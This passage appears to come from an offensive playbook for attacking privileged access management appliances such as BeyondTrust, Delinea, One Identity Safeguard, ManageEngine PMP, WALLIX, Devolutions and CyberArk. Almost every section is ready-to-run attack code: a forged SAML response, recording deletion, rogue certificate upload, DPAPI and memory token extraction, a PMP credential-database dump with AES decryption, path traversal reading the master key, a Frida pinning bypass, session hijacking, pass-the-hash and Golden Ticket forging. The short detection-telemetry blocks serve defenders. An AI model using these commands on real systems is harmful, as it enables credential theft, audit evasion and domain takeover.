  -H 'Content-Type: application/json' \
  -d '{
    "SystemID": REPLACE_WITH_YOUR_SYSTEM_ID,
    "AccountName": "REPLACE_WITH_YOUR_ACCT_NAME",
    "Reason": "incident-response",
    "Duration": 60
  }' \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/credentials | jq -r .CredentialsRequestId)

# Retrieve the password
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/credentials/${ACCESS_REQ}/password" | jq -r .Password
```

### Enumerate Stored Secrets (Credentials)

```bash
# Password Safe also stores arbitrary credentials (similar to CyberArk safes)
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/credentials | \
  jq '.Credentials[] | {CredentialID, Title, UserName, Domain}'
```

### Detection Telemetry

```
BeyondTrust Appliance Audit:
  Action=CredentialRequest
  Action=PasswordReveal
  Action=SessionStart
```

---

## 13. BeyondTrust CVE-2022-2451 SAML Account Injection

### CVE-2022-2451 -- SAML Account Injection

> Reference: BeyondTrust Security Advisory BTN-2022-04. The vulnerability allows an unauthorised SAML identity to be injected into PRA / Password Safe / Identity Security Insights when a specific SAML configuration is in use. Fixed in versions released Q2 2022.

### Discover the Vulnerable SAML Configuration

```bash
# Identify whether the PRA uses SAML auth
curl -sk https://REPLACE_WITH_YOUR_PRA_HOST/login.aspx | grep -i 'saml\|sso'

# Pull the SAML metadata
curl -sk https://REPLACE_WITH_YOUR_PRA_HOST/api/saml/metadata | head -50
```

### Craft a SAML Response

```python
# Python: craft a SAML response with an arbitrary NameID
from lxml import etree
from base64 import b64encode
from datetime import datetime, timedelta

nameid = 'REPLACE_WITH_YOUR_TARGET_USER'  # attacker-supplied
issuer = 'REPLACE_WITH_YOUR_IDP_ENTITY_ID'
audience = 'REPLACE_WITH_YOUR_PRA_ENTITY_ID'

not_on_or_after = (datetime.utcnow() + timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ')

saml = f"""
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_response" Version="2.0" IssueInstant="{datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">{issuer}</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">{nameid}</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotOnOrAfter="{not_on_or_after}">
      <saml:AudienceRestriction><saml:Audience>{audience}</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
  </saml:Assertion>
</samlp:Response>
"""

encoded = b64encode(saml.encode()).decode()
print(encoded)
```

### Submit the SAML Response

```bash
# Submit the SAML response to the PRA SAML consumer endpoint
SAML_RESPONSE=$(python3 craft_saml.py)

curl -sk -c cookies.txt -X POST \
  --data-urlencode "SAMLResponse=$SAML_RESPONSE" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/saml/consume | head -10

# If the cookie is set, you are now authenticated as the target user
curl -sk -b cookies.txt https://REPLACE_WITH_YOUR_PRA_HOST/api/users | jq '.Users[0]'
```

### Detection Telemetry

```
BeyondTrust Appliance Audit:
  Action=SAMLLogon
  User=REPLACE_WITH_YOUR_TARGET_USER
  SourceIP=...
  CertificateThumbprint=... (if the SAML response was signed)
```

### Patch-Level Verification

```bash
# Check the PRA version against BTN-2022-04 fixed versions
curl -sk https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/system/version | jq -r .Version
```

---

## 14. BeyondTrust Session Recording Tampering

### Locate Session Recordings

```bash
# BeyondTrust PRA stores recordings on the appliance under /var/beyondtrust/recordings/
ssh REPLACE_WITH_YOUR_BT_APPLIANCE 'ls -la /var/beyondtrust/recordings/'

# Alternatively via the API, list recordings
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings | \
  jq '.SessionRecordings[] | {SessionID, StartTime, Duration, HasVideo}'
```

### Download a Recording

```bash
SESSION_ID='REPLACE_WITH_YOUR_SESSION_ID'
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings/${SESSION_ID}/video" \
  -o session.btvideo

# Convert from BeyondTrust's format to standard
ffmpeg -i session.btvideo session.mp4
```

### Tamper Detection

```bash
# BeyondTrust recordings include an HMAC for tamper-evidence
# Verify the HMAC
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings/${SESSION_ID}/verify" | jq .
```

### Delete a Recording (Attacker Action)

```bash
# Deleting recordings is a high-signal attacker action (BlackCat playbook step)
curl -sk -X DELETE -H "Authorization: Bearer $BT_TOKEN" \
  "https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/session_recordings/${SESSION_ID}"
```

### Detection Telemetry

```
BeyondTrust Appliance Audit:
  Action=SessionRecordingDelete
  Action=SessionRecordingModify (if tampering occurred)
```

---

## 15. BeyondTrust Bring Your Own Certificate Abuse

### Discover the Endpoint Certificates

```bash
# PRA supports uploading custom certificates per virtual host ("Bring Your Own Certificate")
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/certificates | \
  jq '.Certificates[] | {CommonName, Fingerprint, ExpiresOn}'
```

### Upload a Rogue Certificate

```bash
# Upload a rogue certificate signed by an attacker-controlled CA
# (Requires admin API scope and the "Allow Custom Certificates" feature)
curl -sk -X POST -H "Authorization: Bearer $BT_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "CommonName": "REPLACE_WITH_YOUR_VHOST_NAME",
    "Certificate": "'"$(base64 -w0 rogue.crt)"'",
    "PrivateKey": "'"$(base64 -w0 rogue.key)"'"
  }' \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/certificates
```

### Pivot via the Rogue Certificate

```bash
# The rogue certificate enables MITM of inbound sessions to the affected vhost
# Combine with DNS poisoning to capture operator credentials
sudo bettercap -caplet REPLACE_WITH_YOUR_VHOST_NAME
```

### Detection Telemetry

```
BeyondTrust Appliance Audit:
  Action=CertificateUpload
  CommonName=REPLACE_WITH_YOUR_VHOST_NAME
  UploaderUser=...
```

---

## 16. Delinea Secret Server OAuth Flow

### Acquire OAuth Token

```bash
# Password grant (deprecated but still common)
SS_TOKEN=$(curl -sk -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=password&username=REPLACE_WITH_YOUR_SS_USER&password=REPLACE_WITH_YOUR_SS_PASS' \
  https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/oauth2/token | jq -r .access_token)

# Authorisation code + PKCE (preferred)
# 1. Open the authorisation URL in a browser
echo "https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/oauth2/authorize?response_type=code&client_id=REPLACE_WITH_YOUR_CLIENT_ID&redirect_uri=REPLACE_WITH_YOUR_REDIRECT&code_challenge=REPLACE_WITH_YOUR_CHALLENGE"

# 2. Exchange the code for tokens
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=authorization_code&code=REPLACE_WITH_YOUR_CODE&client_id=REPLACE_WITH_YOUR_CLIENT_ID&code_verifier=REPLACE_WITH_YOUR_VERIFIER&redirect_uri=REPLACE_WITH_YOUR_REDIRECT' \
  https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/oauth2/token
```

### Enumerate Folders and Secrets

```bash
# List folders
curl -sk -H "Authorization: Bearer $SS_TOKEN" \
  https://REPLACE_WITH_YOUR_SS_HOST/api/v1/folders | jq .

# List secrets (the credentials Secret Server manages)
curl -sk -H "Authorization: Bearer $SS_TOKEN" \
  https://REPLACE_WITH_YOUR_SS_HOST/api/v1/secrets | \
  jq '.records[] | {id, name, secretTemplateName, folderId}'
```

### Retrieve a Secret's Fields

```bash
SECRET_ID='REPLACE_WITH_YOUR_SECRET_ID'
curl -sk -H "Authorization: Bearer $SS_TOKEN" \
  "https://REPLACE_WITH_YOUR_SS_HOST/api/v1/secrets/${SECRET_ID}" | \
  jq '.items[] | select(.fieldName | test("password|key|secret|token"; "i")) | {fieldName, itemValue}'
```

### Detection Telemetry

```
Delinea SS Event Framework:
  EventName=LoginEvent
  EventName=SecretViewEvent
  EventName=SecretAccessEvent
  EventName=OAuthTokenIssued
```

---

## 17. Delinea Local Agent Config (DPAPI) Extraction

### Locate the Agent Configuration

```bash
# On a Windows host running the Secret Server distributed engine / agent
# PowerShell: find the config file
#> Get-ChildItem 'C:\Program Files\Thycotic\Distributed Engine\' -Recurse -Filter '*.config'

# Typical path:
#   C:\Program Files\Thycotic\Distributed Engine\DistributedEngine.exe.config
#   C:\ProgramData\Thycotic\Secret Server\enclave.config
```

### Extract the DPAPI Blob

```powershell
# From a Windows foothold with SharpDPAPI
#> SharpDPAPI.exe blobs /target:'C:\Program Files\Thycotic\Distributed Engine\DistributedEngine.exe.config'

# Or via mimikatz:
#> mimikatz # dpapi::blob /in:'DistributedEngine.exe.config' /unprotect
```

### Recover the OAuth Refresh Token

```bash
# The DPAPI blob, once decrypted, contains the OAuth refresh token the agent uses
# to call back to Secret Server

# Use the refresh token to obtain a fresh access token
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=refresh_token&refresh_token=REPLACE_WITH_YOUR_REFRESH_TOKEN&client_id=REPLACE_WITH_YOUR_CLIENT_ID' \
  https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/oauth2/token
```

### Alternative: dump the running engine process

```bash
# If you have local admin, dump the engine's memory and search for tokens
# (Windows)
#> procdump -ma DistributedEngine.exe engine.dmp
#> strings.exe engine.dmp | grep -i 'Bearer\|refresh_token\|access_token'

# (Linux agent)
sudo gcore -o engine.core $(pgrep -f 'DistributedEngine')
strings engine.core.* | grep -iE 'bearer|refresh_token|access_token'
```

### Detection Telemetry

```
Delinea SS Event Framework:
  EventName=AgentLogon (the agent logging in)
  EventName=OAuthTokenIssued (new access tokens)
  EventName=RefreshTokenUsed (rotations)
```

---

## 18. Delinea Distributed Engine Lateral Movement

### Identify the Engine Topology

```bash
# List distributed engines
curl -sk -H "Authorization: Bearer $SS_TOKEN" \
  https://REPLACE_WITH_YOUR_SS_HOST/api/v1/distributed-engines | \
  jq '.records[] | {id, name, siteId, status, lastSeen}'
```

### Compromise an Engine to Pivot to Other Sites

```bash
# An engine registered to Site A can often be reconfigured to Site B if the
# site registration token is recoverable from the agent config

# Recover the site registration token via DPAPI (Section 17)
REG_TOKEN=$(cat site_token.txt)

# Re-register the engine against a new Secret Server instance (lab scenario)
#> DistributedEngine.exe --register --url=https://attacker-ss/SecretServer --token=$REG_TOKEN
```

### Use the Engine as a Relay

```bash
# The engine listens on TCP/443 (or a custom port) for Secret Server callbacks
# Configure the engine to forward callbacks to an attacker-controlled host
# (Requires write access to the engine config)

# Modify the engine config to point to an attacker MITM
#> Set-Content -Path 'C:\ProgramData\Thycotic\Secret Server\enclave.config' \
#    -Value (Get-Content enclave.config).Replace('https://legit-ss/SecretServer', 'https://attacker-ss/SecretServer')
```

### Detection Telemetry

```
Delinea SS Event Framework:
  EventName=EngineSiteChanged
  EventName=EngineHeartbeatMissed
  EventName=EngineLogonFromNewIP
```

---

## 19. One Identity Safeguard Admin Console Recon

### Identify the Safeguard Product Mix

```bash
# Safeguard for Privileged Passwords (SPP) — the password safe
curl -sk https://REPLACE_WITH_YOUR_SG_HOST/spp/api/v3/AuthenticationUser | head -5

# Safeguard for Privileged Sessions (SPS) — the session broker
curl -sk https://REPLACE_WITH_YOUR_SG_HOST/sps/api/v3/Session | head -5

# Safeguard for Privileged Analytics (SPA) — the SIEM
curl -sk https://REPLACE_WITH_YOUR_SG_HOST/spa/api/v3/Event | head -5
```

### Authentication via Login Flow

```bash
# Acquire a session token via the SPP login flow
curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"ProviderName":"Local","UserName":"REPLACE_WITH_YOUR_SG_USER","Password":"REPLACE_WITH_YOUR_SG_PASS"}' \
  https://REPLACE_WITH_YOUR_SG_HOST/spp/api/v3/AuthenticationUser | jq .

# Persist via refresh token
curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"RefreshToken":"REPLACE_WITH_YOUR_REFRESH"}' \
  https://REPLACE_WITH_YOUR_SG_HOST/spp/api/v3/AuthenticationUser/Refresh
```

### Enumerate Assets and Accounts

```bash
# List assets (the privileged targets Safeguard manages)
curl -sk -H "Authorization: Bearer $SG_TOKEN" \
  https://REPLACE_WITH_YOUR_SG_HOST/spp/api/v3/Assets | \
  jq '.Items[] | {Id, Name, AssetPlatform, DomainName, IPAddress}'

# List accounts per asset
curl -sk -H "Authorization: Bearer $SG_TOKEN" \
  https://REPLACE_WITH_YOUR_SG_HOST/spp/api/v3/Assets/REPLACE_WITH_YOUR_ASSET_ID/Accounts | \
  jq '.Items[] | {Id, Name, DomainName}'
```

### Detection Telemetry

```
Safeguard Audit Log:
  Action=Login
  Action=GetAsset
  Action=GetAccountPassword
  Action=SessionStart
```

---

## 20. One Identity SSL Pinning Bypass

### Identify SSL Pinning

```bash
# The Safeguard admin console implements SSL pinning against the appliance certificate
# Confirm by MITMing with a custom CA
mitmproxy --mode reverse:https://REPLACE_WITH_YOUR_SG_HOST
# Browse to the appliance via the proxy -- the admin console will refuse to connect
```

### Frida SSL Pinning Bypass Script

```javascript
// frida-bypass.js -- run with frida -l frida-bypass.js -p <PID> on the appliance's browser
// or against the admin console's JavaScript bundle

Java.perform(function() {
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    var TrustManager = Java.registerClass({
        name: 'com.frida.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;',
        'java.security.SecureRandom'
    ).implementation = function(km, tm, sr) {
        this.init(km, [TrustManager.$new()], sr);
    };
});
```

### Apply the Bypass from Kali

```bash
# Pair frida-server on the appliance (if reachable via USB or SSH) with frida on Kali
frida-ls-devices
frida -U -l frida-bypass.js -f com.oneidentity.safeguard.admin

# Or hook the browser context if pinning is in the admin console's JS
# Use Burp Suite + a JS injection proxy:
mitmweb --mode reverse:https://REPLACE_WITH_YOUR_SG_HOST \
        --modify-headers='~h^Content-Security-Policy:'
```

### Detection Telemetry

```
Safeguard Audit Log:
  Action=AdminConsoleLoginFromNewIP
  Action=CertificateValidationError (pinning failure)
```

---

## 21. One Identity Privileged Session Fabric Abuse

### List Active Sessions

```bash
# Sessions2 (the privileged session broker) exposes a session API
curl -sk -H "Authorization: Bearer $SG_TOKEN" \
  https://REPLACE_WITH_YOUR_SG_HOST/sps/api/v3/Session | \
  jq '.Items[] | {Id, AssetName, AccountName, StartTime, Status}'
```

### Initiate a Session as Another User

```bash
# Open a session to an asset via the fabric (no client-side credential disclosure)
curl -sk -X POST -H "Authorization: Bearer $SG_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "AssetId": REPLACE_WITH_YOUR_ASSET_ID,
    "AccountId": REPLACE_WITH_YOUR_ACCT_ID,
    "Reason": "incident-response",
    "ConnectionMethod": "SSH"
  }' \
  https://REPLACE_WITH_YOUR_SG_HOST/sps/api/v3/Session
```

### Retrieve Session Metadata

```bash
# Get the connection details (the fabric returns a one-time connection token)
curl -sk -H "Authorization: Bearer $SG_TOKEN" \
  https://REPLACE_WITH_YOUR_SG_HOST/sps/api/v3/Session/REPLACE_WITH_YOUR_SESSION_ID | jq .

# Use the one-time token to connect directly to the fabric
ssh -p REPLACE_WITH_YOUR_FABRIC_PORT REPLACE_WITH_YOUR_TARGET_USER@REPLACE_WITH_YOUR_FABRIC_HOST
# (the fabric prompts for the one-time token)
```

### Hijack an Active Session

```bash
# If you have admin on the fabric, you can attach to any active session
# (high-signal attacker action)
curl -sk -X POST -H "Authorization: Bearer $SG_TOKEN" \
  https://REPLACE_WITH_YOUR_SG_HOST/sps/api/v3/Session/REPLACE_WITH_YOUR_SESSION_ID/Attach
```

### Detection Telemetry

```
Safeguard (SPS) Audit Log:
  Action=SessionStart
  Action=SessionAttach (high-signal)
  Action=SessionRecordingInterrupted
```

---

## 22. ManageEngine PMP API Authentication

### Acquire API Token via Admin Flow

```bash
# Acquire the API key (requires admin or a non-SSO user)
PMP_TOKEN=$(curl -sk -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=REPLACE_WITH_YOUR_PMP_USER&password=REPLACE_WITH_YOUR_PMP_PASS' \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/admin/getkey' | jq -r .api_key)

echo "[+] PMP API key: $PMP_TOKEN"
```

### Acquire via LDAP User

```bash
# LDAP users obtain a user-API-key via a different flow
PMP_USER_TOKEN=$(curl -sk -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=REPLACE_WITH_YOUR_LDAP_USER&password=REPLACE_WITH_YOUR_LDAP_PASS&LDAPServer=REPLACE_WITH_YOUR_LDAP_NAME' \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/admin/getkey' | jq -r .api_key)
```

### Validate the Token

```bash
curl -sk -H "AUTHTOKEN=$PMP_TOKEN" \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/resources/list' | jq .
```

### Detection Telemetry

```
ManageEngine PMP audit (PostgreSQL table pmpaudits):
  Operation=Login
  Operation=GetAPIKey
  Operation=ListResources
  Operation=GetPassword (high-signal)
```

---

## 23. ManageEngine PMP Resource and Password Enumeration

### Enumerate Resources

```bash
# A "resource" in PMP is a managed host / service
curl -sk -H "AUTHTOKEN=$PMP_TOKEN" \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/resources/list?getActiveAccounts=true' | \
  jq '.resources[] | {resourceid, resourcename, resourceurl, accountname}'
```

### Enumerate Accounts per Resource

```bash
RES_ID='REPLACE_WITH_YOUR_RES_ID'
curl -sk -H "AUTHTOKEN=$PMP_TOKEN" \
  "https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/resource/${RES_ID}/getPasswordAccountDetails" | \
  jq '.details[] | {accountname, logonusername, accounttype}'
```

### Retrieve a Password

```bash
# Pull the password for an account
PASS=$(curl -sk -H "AUTHTOKEN=$PMP_TOKEN" \
  -d 'reason=incident-response' \
  "https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/resource/${RES_ID}/getAccountPasswd" \
  | jq -r .password)

echo "[+] Password: $PASS"
```

### Requestor-Approver Flow

```bash
# Some accounts are configured for requestor-approver (PMP's JIT flow)
curl -sk -X POST -H "AUTHTOKEN=$PMP_TOKEN" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'reason=incident-response&duration=60' \
  "https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/resource/${RES_ID}/requestAccountAccess"
```

### Detection Telemetry

```
ManageEngine PMP audit:
  Operation=ListResources
  Operation=GetAccountDetails
  Operation=GetPassword
  Operation=RequestAccess
  Operation=ApproveAccess
```

---

## 24. ManageEngine PMP PostgreSQL Backend Extraction

### Locate the Embedded PostgreSQL

```bash
# PMP ships with an embedded PostgreSQL instance
# Default location on Linux: /opt/ManageEngine/PMP/pgsql/
# Default location on Windows: C:\Program Files\ManageEngine\PMP\pgsql\

# Locate the data directory
find /opt/ManageEngine -name 'postgresql.conf' 2>/dev/null
```

### Identify the PostgreSQL Port

```bash
# PMP uses a non-default port (typically 2345 or 2346)
grep -i 'port' /opt/ManageEngine/PMP/pgsql/data/postgresql.conf | head -3

# The master password for the embedded PG is in server.xml or the PMP conf
grep -i 'password' /opt/ManageEngine/PMP/conf/server.xml | head -3
```

### Dump the Credential Tables

```bash
# Connect via the local socket (often peer-authenticated)
sudo -u postgres psql -p 2345 -d PassTrix -c '\dt'

# Dump the credential table
sudo -u postgres psql -p 2345 -d PassTrix -c \
  'SELECT resource_id, account_id, password_blob FROM passwd;' > creds_dump.txt

# Alternatively via the network
psql -h REPLACE_WITH_YOUR_PMP_HOST -p 2345 -U pmpuser -d PassTrix -c 'SELECT * FROM passwd LIMIT 5;'
```

### Decrypt the Password Blob

```bash
# PMP encrypts the password_blob column with AES-128-CBC keyed by the PMP master key
# The master key is in /opt/ManageEngine/PMP/conf/pmp_key.key
MASTER_KEY=$(xxd -p /opt/ManageEngine/PMP/conf/pmp_key.key | head -c 32)

python3 - <<PY
from Crypto.Cipher import AES
from base64 import b64decode
key = bytes.fromhex('$MASTER_KEY')
with open('creds_dump.txt') as f:
    lines = f.readlines()
for line in lines[2:-1]:
    parts = line.split('|')
    if len(parts) >= 3:
        blob = b64decode(parts[2].strip())
        iv, ct = blob[:16], blob[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = cipher.decrypt(ct)
        # Strip PKCS7 padding
        pad = pt[-1]
        pt = pt[:-pad]
        print(f'{parts[0].strip()} | {parts[1].strip()} | {pt.decode()}')
PY
```

### Detection Telemetry

```
ManageEngine PMP audit:
  Operation=LocalLogon (SSH/RDP to the PMP server)
  Operation=DatabaseAccess (PostgreSQL direct connection)
  Operation=FileRead (pmp_key.key access)
```

---

## 25. ManageEngine CVE-2022-28226 Area Abuse

### CVE-2022-28226 -- PMP Path Traversal (illustrative)

> Reference: ManageEngine Security Advisory, 2022. Pre-auth path traversal enabling access to restricted API endpoints or file disclosure on ManageEngine Password Manager Pro.

### Identify the Affected Version

```bash
# PMP version is exposed in the About page
curl -sk 'https://REPLACE_WITH_YOUR_PMP_HOST:7272' | grep -i 'version\|build'

# Or via the API
curl -sk -H "AUTHTOKEN=$PMP_TOKEN" \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/server/getBuildDetails'
```

### Path Traversal Payload (illustrative)

```bash
# The traversal pattern targets the static resource handler
curl -sk --path-as-is \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/..%2f..%2f..%2f..%2fetc/passwd' | head -5

# Or via a parameter:
curl -sk --path-as-is \
  "https://REPLACE_WITH_YOUR_PMP_HOST:7272/api/json/server/getFile?file=../../../../etc/passwd"
```

### Use the Traversal to Read the Master Key

```bash
# Combine with Section 24 — read pmp_key.key via traversal
curl -sk --path-as-is \
  'https://REPLACE_WITH_YOUR_PMP_HOST:7272/..%2f..%2f..%2fconf/pmp_key.key' -o pmp_key.key

xxd pmp_key.key
```

### Detection Telemetry

```
ManageEngine PMP audit:
  Operation=HTTP404 (failed traversal)
  Operation=FileRead (successful traversal)
```

---

## 26. WALLIX Bastion Abuse

### Authentication via the Admin CLI

```bash
# WALLIX Access Manager Bastion (WAB) ships with wabadmin
ssh admin@REPLACE_WITH_YOUR_WAB_HOST
wabadmin

# Inside the wabadmin shell:
# > users list
# > devices list
# > accounts list
```

### API Authentication

```bash
# WALLIX Access Manager exposes an HTTP API
WAB_TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"username":"REPLACE_WITH_YOUR_WAB_USER","password":"REPLACE_WITH_YOUR_WAB_PASS"}' \
  https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/auth/login | jq -r .token)

curl -sk -H "Authorization: Bearer $WAB_TOKEN" \
  https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/devices | jq .
```

### Enumerate Sessions and Records

```bash
# List active sessions
curl -sk -H "Authorization: Bearer $WAB_TOKEN" \
  https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/sessions | \
  jq '.[] | {id, user, target, status, start_time}'

# Download a session recording
curl -sk -H "Authorization: Bearer $WAB_TOKEN" \
  https://REPLACE_WITH_YOUR_WAB_HOST:443/wab/api/v1/sessions/REPLACE_WITH_YOUR_SESSION_ID/recording \
  -o session.cast
```

### Detection Telemetry

```
WALLIX Access Manager audit:
  Action=Login (admin API)
  Action=ListDevices
  Action=ListAccounts
  Action=SessionStart
  Action=RecordingDownload
```

---

## 27. Devolutions Server Abuse

### Authentication

```bash
# DVLS uses a proprietary auth API
DVLS_TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{
    "UserName":"REPLACE_WITH_YOUR_DVLS_USER",
    "Password":"REPLACE_WITH_YOUR_DVLS_PASS",
    "Domain":"REPLACE_WITH_YOUR_DVLS_DOMAIN"
  }' \
  https://REPLACE_WITH_YOUR_DVLS_HOST/api/v1/login | jq -r .token)
```

### Enumerate Vaults and Entries

```bash
# List vaults
curl -sk -H "Authorization: Bearer $DVLS_TOKEN" \
  https://REPLACE_WITH_YOUR_DVLS_HOST/api/v1/vaults | jq .

# List entries (credentials)
curl -sk -H "Authorization: Bearer $DVLS_TOKEN" \
  https://REPLACE_WITH_YOUR_DVLS_HOST/api/v1/vaults/REPLACE_WITH_YOUR_VAULT_ID/entries | \
  jq '.[] | {id, title, username, host}'
```

### Retrieve an Entry's Secret

```bash
ENTRY_ID='REPLACE_WITH_YOUR_ENTRY_ID'
curl -sk -H "Authorization: Bearer $DVLS_TOKEN" \
  "https://REPLACE_WITH_YOUR_DVLS_HOST/api/v1/vaults/REPLACE_WITH_YOUR_VAULT_ID/entries/${ENTRY_ID}/sensitive" | jq .
```

### Detection Telemetry

```
Devolutions Server audit:
  Action=Login
  Action=ListVaults
  Action=ListEntries
  Action=ReadSensitiveData
```

---

## 28. Xton Core Abuse

### Authentication

```bash
# Xton Core (formerly Bozteck) uses API key auth
XTON_TOKEN='REPLACE_WITH_YOUR_XTON_API_KEY'

curl -sk -H "X-Api-Key: $XTON_TOKEN" \
  https://REPLACE_WITH_YOUR_XTON_HOST:8081/api/v1/safes | jq .
```

### Enumerate Safes and Credentials

```bash
# List safes
curl -sk -H "X-Api-Key: $XTON_TOKEN" \
  https://REPLACE_WITH_YOUR_XTON_HOST:8081/api/v1/safes | jq .

# List credentials in a safe
curl -sk -H "X-Api-Key: $XTON_TOKEN" \
  https://REPLACE_WITH_YOUR_XTON_HOST:8081/api/v1/safes/REPLACE_WITH_YOUR_SAFE_ID/credentials | \
  jq '.[] | {id, name, username, hostname}'

# Retrieve the password
curl -sk -X POST -H "X-Api-Key: $XTON_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"reason":"incident-response"}' \
  https://REPLACE_WITH_YOUR_XTON_HOST:8081/api/v1/credentials/REPLACE_WITH_YOUR_CRED_ID/reveal | jq .
```

### Detection Telemetry

```
Xton Core audit:
  Action=ApiKeyAuth
  Action=ListSafes
  Action=ListCredentials
  Action=RevealPassword
```

---

## 29. Cross-Cutting: Pass-the-Hash in PAM Contexts

### Recognise a PAM-Rotated Hash

```bash
# A credential checked out from a PAM is typically rotated after the session ends
# The hash will only be valid for the rotation window

# After harvesting the NTLM hash of a privileged account via mimikatz:
#> sekurlsa::msv
# Dump the NTLM hash of REPLACE_WITH_YOUR_DA_NAME

# Check the PAM rotation schedule for the account
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID" | \
  jq '.platformAccountProperties | {AutoChange, LastChange, NextChange}'
```

### Pass-the-Hash Within the Window

```bash
# Use the harvested hash within the rotation window
impacket-wmiexec -hashes :REPLACE_WITH_YOUR_NTLM_HASH \
  REPLACE_WITH_YOUR_DOMAIN/REPLACE_WITH_YOUR_DA_NAME@REPLACE_WITH_YOUR_DC_IP

# Or via crackmapexec
crackmapexec smb REPLACE_WITH_YOUR_TARGET_RANGE \
  -u 'REPLACE_WITH_YOUR_DA_NAME' -H 'REPLACE_WITH_YOUR_NTLM_HASH' \
  --shares
```

### Trigger Immediate Rotation (Defender Action)

```bash
# If you are a defender and detect PtH on a PAM-managed account, force rotation:
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID/Change
```

### Detection Telemetry

```
CyberArk Vault Audit:
  EventID=310 Change Password (rotation)
  EventID=303 Get Password (preceding the PtH)

Endpoint EDR:
  Action=PassTheHashAttempt
  Account=REPLACE_WITH_YOUR_DA_NAME
  SourceProcess=lsass.exe (or attacker tool)
```

---

## 30. Cross-Cutting: Golden Ticket Interaction with PAM Rotation

### Why Golden Ticket Defeats PAM Rotation

```bash
# A Golden Ticket forged with the krbtgt hash is independent of the user's password
# PAM rotation does NOT rotate the krbtgt account, so the Golden Ticket survives

# Forge a Golden Ticket (assumes you have the krbtgt hash)
impacket-ticketer -nthash REPLACE_WITH_YOUR_KRBTGT_HASH \
  -domain-sid REPLACE_WITH_YOUR_DOMAIN_SID \
  -domain REPLACE_WITH_YOUR_DOMAIN \
  -spn krbtgt/REPLACE_WITH_YOUR_DOMAIN \
  REPLACE_WITH_YOUR_DA_NAME

KRB5CCNAME=REPLACE_WITH_YOUR_DA_NAME.ccache impacket-secretsdump \
  -k -no-pass REPLACE_WITH_YOUR_DC_HOST
```

### PAM-Aware Golden Ticket Strategy

```bash
# Use the PAM-recovered Domain Admin credential to obtain krbtgt (DCSync)
impacket-secretsdump REPLACE_WITH_YOUR_DOMAIN/REPLACE_WITH_YOUR_DA_NAME:REPLACE_WITH_YOUR_DA_PASS@REPLACE_WITH_YOUR_DC_IP \
